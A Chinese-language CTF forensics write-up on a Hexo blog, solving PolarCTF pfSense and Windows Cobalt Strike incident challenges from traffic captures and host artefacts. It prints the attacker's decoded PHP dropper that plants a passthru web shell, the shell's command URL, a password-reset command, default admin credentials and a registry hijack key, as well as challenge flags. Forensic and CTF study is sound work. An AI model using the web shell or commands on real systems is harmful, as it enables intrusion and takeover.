@@ -1,0 +1,858 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fuk.png">
+  <link rel="icon" href="https://img.dkdun.cn/v1/2024/12/83e0272660805f52.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="butt3rf1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="两个简单的取证">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PolarCTF个人挑战赛-Misc">
+<meta property="og:url" content="http://example.com/2025/03/23/PolarCTF%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Misc/index.html">
+<meta property="og:site_name" content="(｡･ω･｡)Welcome~">
+<meta property="og:description" content="两个简单的取证">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/30cc3def4e54dc7d.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/5db2396b294b7fd7.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/ddc0a613b7a0b1a2.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/5be58b647ab46f99.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/42ec91e9abda60e2.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/43d8a64a9c4093fa.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/f1a1977a7ea2dd36.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/8c8151bbb2eaa897.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/a40ffff95fae77bd.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/b390012a0800795b.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/a42499ac6767e53e.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/e534d3fbfecad5da.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/77db36ec04799d87.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/46bd81ce2e2e4faf.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/80c55bba110881b5.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/8833b2ee636d36bd.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/d0adeb57519e7386.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/7c9eb10afeafad45.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/9d16b9098fad2af6.png">
+<meta property="article:published_time" content="2025-03-23T06:26:23.000Z">
+<meta property="article:modified_time" content="2025-03-23T06:39:35.627Z">
+<meta property="article:author" content="butt3rf1y">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/30cc3def4e54dc7d.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>PolarCTF个人挑战赛-Misc - (｡･ω･｡)Welcome~</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>butt3rf1y&#39;s Space</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://img.dkdun.cn/v1/2025/12/3473793514d205aa.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PolarCTF个人挑战赛-Misc"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-23 14:26" pubdate>
+          2025年3月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          650 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+	<link rel="icon" href="https://img.dkdun.cn/v1/2024/12/e40f2f1a8320e35c.png" type="image/x-icon">
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PolarCTF个人挑战赛-Misc</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年3月23日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>两个简单的取证</p>
+<span id="more"></span>
+
+<h1 id="pfsense"><a href="#pfsense" class="headerlink" title="pfsense"></a>pfsense</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">1</span>、从流量数据包中找出攻击者利用漏洞开展攻击的会话，写出其中攻击者执行的命令中设置的<span class="hljs-built_in">flag</span>内容<br><span class="hljs-number">2</span>、攻击者通过漏洞利用获取设备控制权限，然后查找设备上的<span class="hljs-built_in">flag</span>文件，写出<span class="hljs-built_in">flag</span>的文件内容<br><span class="hljs-number">3</span>、找出并提交受控机设备中普通用户的IPsec预共享密钥<br></code></pre></td></tr></table></figure>
+
+<h2 id="pfsense1"><a href="#pfsense1" class="headerlink" title="pfsense1"></a>pfsense1</h2><p>Wireshark 过滤 http 流量，找到了攻击会话</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/30cc3def4e54dc7d.png"></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">8</span>kYT<span class="hljs-number">1</span>mb<span class="hljs-number">3</span>BlbigiL<span class="hljs-number">3</span>Vzci<span class="hljs-number">9</span>sb<span class="hljs-number">2</span><span class="hljs-symbol">NhbC93</span>d<span class="hljs-number">3</span>c<span class="hljs-attr">vc3</span>lzdGVtX<span class="hljs-number">2</span>FkdmFuY<span class="hljs-number">2</span>VkX<span class="hljs-number">2</span><span class="hljs-symbol">NvbnRyb2</span>wucGhwIiwidyIpI<span class="hljs-name">G9</span>yIGRpZSgpOyR<span class="hljs-number">0</span>PSc<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocCBwcmludChwYX<span class="hljs-symbol">NzdGhydSggJF9</span>HRVRbImMiXSkpOz<span class="hljs-number">8</span>+Jztmd<span class="hljs-number">3</span>JpdGUoJGEsJHQp<span class="hljs-meta">O2</span>Zjb<span class="hljs-name">G9</span>zZSggJGEpOz<span class="hljs-number">8</span>+ZmxhZ<span class="hljs-number">3</span>tjOTMwYTIw<span class="hljs-symbol">NzI5</span>Y<span class="hljs-number">2</span>Q<span class="hljs-number">3</span>MTBjOWFjMmUxYm<span class="hljs-symbol">NkMzY4</span><span class="hljs-symbol">NTZlNX0</span>=<br></code></pre></td></tr></table></figure>
+
+<p>base64 解码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/usr/local/www/system_advanced_control.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;&lt;?php print(passthru( $_GET[&quot;c&quot;]));?&gt;&#x27;</span>;<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$t</span>);<span class="hljs-title function_ invoke__">fclose</span>( <span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span>flag&#123;c930a20729cd710c9ac2e1bcd36856e5&#125;<br></code></pre></td></tr></table></figure>
+
+<p>拿到 flag</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-keyword">c</span><span class="hljs-number">930</span>a<span class="hljs-number">20729</span>cd<span class="hljs-number">710</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ac<span class="hljs-number">2e1</span>bcd<span class="hljs-number">36856e5</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="pfsense2"><a href="#pfsense2" class="headerlink" title="pfsense2"></a>pfsense2</h2><p>可以看到攻击者执行了 <code>ls -al</code> 命令</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/5db2396b294b7fd7.png"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.139.2.139/system_advanced_control.php?c=ls -al<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/ddc0a613b7a0b1a2.png"></p>
+<p>按照会话显示上传木马</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/5be58b647ab46f99.png"></p>
+<p>执行会得到结果，用 find 命令查找 flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;fla*&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/42ec91e9abda60e2.png"></p>
+<p>找到 flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>b030dacb6e82a5cca0b1e6d2c8779fa&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="pfsense3"><a href="#pfsense3" class="headerlink" title="pfsense3"></a>pfsense3</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>搜了一下 pfSense 的默认密码</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>pfsense<br></code></pre></td></tr></table></figure>
+
+<p>不行，然后找到了重置密码方法，“运行<code>/etc/rc.initial.password</code>以重置为默认密码”</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;y&quot;</span> | /etc/rc.initial.password<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/43d8a64a9c4093fa.png"></p>
+<p>登录进去后找到 VPN 中的 IPSec</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>pfsense<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/f1a1977a7ea2dd36.png"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;bde<span class="hljs-number">4</span>b<span class="hljs-number">5e2</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">43</span><span class="hljs-keyword">c</span><span class="hljs-number">177895</span>f<span class="hljs-number">6</span>f<span class="hljs-number">5</span>d<span class="hljs-number">85</span>beb<span class="hljs-number">97</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>查找 <code>config.xml</code> 配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*config.xml&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>在 <code>/cf/conf/config.xml</code> 文件中找到 flag</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/8c8151bbb2eaa897.png"></p>
+<h1 id="WinCS"><a href="#WinCS" class="headerlink" title="WinCS"></a>WinCS</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.受控机器木马的回连的<span class="hljs-built_in">ip</span>地址和端口是？（flag&#123;<span class="hljs-built_in">ip</span>:端口&#125;）<br><span class="hljs-number">2</span>.分析流量信息，攻击者尝试修改的jhon账户密码是什么？<br><span class="hljs-number">3</span>.分析流量当中，攻击者查看的文件中flag内容是什么？<br><span class="hljs-number">4</span>.攻击者在攻击过程当中修改过的注册表目录是什么？<br><span class="hljs-number">5</span>.受控机当中加密文件的内容是什么？<br><span class="hljs-number">6</span>.受控机木马的自启动文件路径是什么？<br></code></pre></td></tr></table></figure>
+
+<h2 id="WinCS1"><a href="#WinCS1" class="headerlink" title="WinCS1"></a>WinCS1</h2><p>在火绒的信任项中有一个可以 <code>.exe</code> 文件</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/a40ffff95fae77bd.png"></p>
+<p>拿出来放入微步沙箱查杀，判定为木马</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/b390012a0800795b.png"></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/a42499ac6767e53e.png"></p>
+<p>拿到回连 IP： 61.139.2.139:80，md5 加密</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">7</span>f5804a75be7662bf6745457be3b1a18&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="WinCS2"><a href="#WinCS2" class="headerlink" title="WinCS2"></a>WinCS2</h2><p>jhon 用户目录下有两张一样的图片</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/e534d3fbfecad5da.png"></p>
+<p>用 010 打开发现两张图片最后都有压缩包数据，并且能看见 <code>.cobaltstrike.beacon_keys</code> 字样</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/77db36ec04799d87.png"></p>
+<p>新建十六进制文件，把两张图片中的数据复制到新的文件保存得到压缩包，里面有 <code>.cobaltstrike.beacon_keys</code></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/46bd81ce2e2e4faf.png"></p>
+<p>导入 NatA 分析得到 jhon 用户密码</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/80c55bba110881b5.png"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">flag&#123;<span class="hljs-selector-tag">P</span><span class="hljs-keyword">@ssW0rd</span><span class="hljs-keyword">@123</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="WinCS3"><a href="#WinCS3" class="headerlink" title="WinCS3"></a>WinCS3</h2><p>往下翻找到</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/8833b2ee636d36bd.png"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">31975589</span>df49e6ce84853be7582549f4&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="WinCS4"><a href="#WinCS4" class="headerlink" title="WinCS4"></a>WinCS4</h2><p><img src="https://img.dkdun.cn/v1/2025/12/d0adeb57519e7386.png"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">HKEY_CURRENT_USER\Software\Classes\mscfile\<span class="hljs-built_in">shell</span>\<span class="hljs-built_in">open</span>\<span class="hljs-keyword">command</span><br></code></pre></td></tr></table></figure>
+
+<p>md5 加密</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">87</span>a76255029843238bf87091dd5a6c88&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="WinCS5"><a href="#WinCS5" class="headerlink" title="WinCS5"></a>WinCS5</h2><p>从之前的分析中还发现 jhon 用户目录下还有一个 <code>passkey.txt</code>，并且还有密码</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">PolarCTF@</span><span class="hljs-number">2025</span>Spring<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/7c9eb10afeafad45.png"></p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;fc51bd0633d256f2dcbe282efa205c3a&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="WinCS6"><a href="#WinCS6" class="headerlink" title="WinCS6"></a>WinCS6</h2><p>在 <code>C:\Users\jhon\AppData\Local\Temp</code> 下发现批处理文件</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/9d16b9098fad2af6.png"></p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\jhon\AppData\Local\Temp\power.bat<br></code></pre></td></tr></table></figure>
+
+<p>md5 加密</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;e991ef211ab8adc893dc874c4ae929b3&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="category-chain-item">应急响应</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PolarCTF个人挑战赛-Misc</div>
+      <div>http://example.com/2025/03/23/PolarCTF个人挑战赛-Misc/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>butt3rf1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/22/HTB-Chemistry/" title="HTB-Chemistry">
+                        <span class="hidden-mobile">HTB-Chemistry</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"rWKtzRd76Kz6dC7Vd9dUwQux-gzGzoHsz","appKey":"DxMgc7gveh6B1aJKyAZnoFNj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span> </a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
